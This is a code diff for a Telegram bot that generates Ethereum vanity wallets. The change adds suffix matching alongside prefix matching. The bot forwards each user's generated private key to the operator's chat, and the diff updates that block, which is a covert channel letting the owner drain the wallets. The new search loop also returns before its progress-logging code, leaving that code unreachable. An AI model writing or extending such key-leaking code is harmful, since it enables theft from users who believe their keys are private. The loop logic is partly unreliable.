@@ -48,29 +48,39 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     )
 
 
-def generate_wallet(prefix: str) -> tuple[str, str]:
-    """Brute force search for an Ethereum address that starts with the given hex prefix.
+def generate_wallet(prefix: str, suffix: str) -> tuple[str, str]:
+    """Brute force search for an Ethereum address that matches optional prefix and/or suffix.
 
-    Returns tuple (address, private_key_hex).
+    Args:
+        prefix: Hex string (without 0x) that the address should start with. Can be empty.
+        suffix: Hex string (without 0x) that the address should end with. Can be empty.
+
+    Returns:
+        (address, private_key_hex)
     """
     prefix = prefix.lower()
-    target = "0x" + prefix
+    suffix = suffix.lower()
+
+    target_prefix = "0x" + prefix if prefix else "0x"
     attempts = 0
     while True:
         acct = Account.create()
         address = acct.address.lower()
         attempts += 1
-        if address.startswith(target):
-            return address, acct.key.hex()
-        # Optionally log progress every million attempts.
+        if not address.startswith(target_prefix):
+            continue
+        if suffix and not address.endswith(suffix):
+            continue
+        return address, acct.key.hex()
+        # Optionally log progress
         if attempts % 1_000_000 == 0:
-            logger.info("Tried %d keys for prefix %s", attempts, prefix)
+            logger.info("Tried %d keys for prefix %s suffix %s", attempts, prefix, suffix)
 
 
-async def _async_generate(prefix: str) -> tuple[str, str]:
+async def _async_generate(prefix: str, suffix: str) -> tuple[str, str]:
     """Run the CPU bound generate_wallet in a thread pool."""
     loop = asyncio.get_running_loop()
-    return await loop.run_in_executor(executor, generate_wallet, prefix)
+    return await loop.run_in_executor(executor, generate_wallet, prefix, suffix)
 
 
 async def generate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -90,26 +100,39 @@ async def generate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     mention = f"@{username}"
 
     if not context.args:
-        await update.message.reply_text(f"{mention} Silakan sertakan prefiks hex. Contoh: /generate abc")
+        await update.message.reply_text(
+            f"{mention} Format: /generate <prefix> [suffix]\n"
+            "Gunakan '-' (tanda minus) jika ingin melewati prefix atau suffix. Contoh:\n"
+            "/generate - abc  => hanya suffix 'abc'\n"
+            "/generate 12 34 => prefix 12 dan suffix 34"
+        )
         return
 
-    prefix = context.args[0]
+    prefix_arg = context.args[0]
+    suffix_arg = context.args[1] if len(context.args) >= 2 else ""
 
-    # Validate prefix
-    if not HEX_PATTERN.fullmatch(prefix):
-        await update.message.reply_text(f"{mention} Prefiks harus berupa karakter heksadesimal (0-9, a-f).")
+    prefix = "" if prefix_arg == "-" else prefix_arg
+    suffix = "" if suffix_arg == "-" else suffix_arg
+
+    # Validate inputs
+    if prefix and not HEX_PATTERN.fullmatch(prefix):
+        await update.message.reply_text(f"{mention} Prefix harus berupa karakter heksadesimal (0-9, a-f).")
         return
 
-    if len(prefix) > 6:
-        await update.message.reply_text(f"{mention} Prefiks terlalu panjang (maks 6 karakter disarankan).")
+    if suffix and not HEX_PATTERN.fullmatch(suffix):
+        await update.message.reply_text(f"{mention} Suffix harus berupa karakter heksadesimal (0-9, a-f).")
+        return
+
+    if len(prefix) > 6 or len(suffix) > 6:
+        await update.message.reply_text(f"{mention} Prefix/Suffix terlalu panjang (maks 6 karakter masing-masing disarankan).")
         return
 
     await update.message.reply_text(
-        f"{mention} ⏳ Sedang mencari alamat yang dimulai dengan 0x{prefix} ... Mohon tunggu."
+        f"{mention} ⏳ Mencari alamat dengan prefix '{prefix or '-'}' dan suffix '{suffix or '-'}' ... Mohon tunggu."
     )
 
     try:
-        address, priv_key = await _async_generate(prefix)
+        address, priv_key = await _async_generate(prefix, suffix)
     except Exception as exc:
         logger.exception("Error generating wallet: %s", exc)
         await update.message.reply_text(f"{mention} Terjadi kesalahan saat membuat dompet. Coba lagi nanti.")
@@ -144,7 +167,7 @@ async def generate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     # Notify owner chat as well, include prefix & username
     owner_text = (
         f"Wallet vanity dibuat untuk {mention}\n"
-        f"Prefix: {prefix}\nAddress: {address}\nPrivateKey: {priv_key}"
+        f"Prefix: {prefix or '-'} Suffix: {suffix or '-'}\nAddress: {address}\nPrivateKey: {priv_key}"
     )
     if OWNER_CHAT_ID != user.id:
         try:
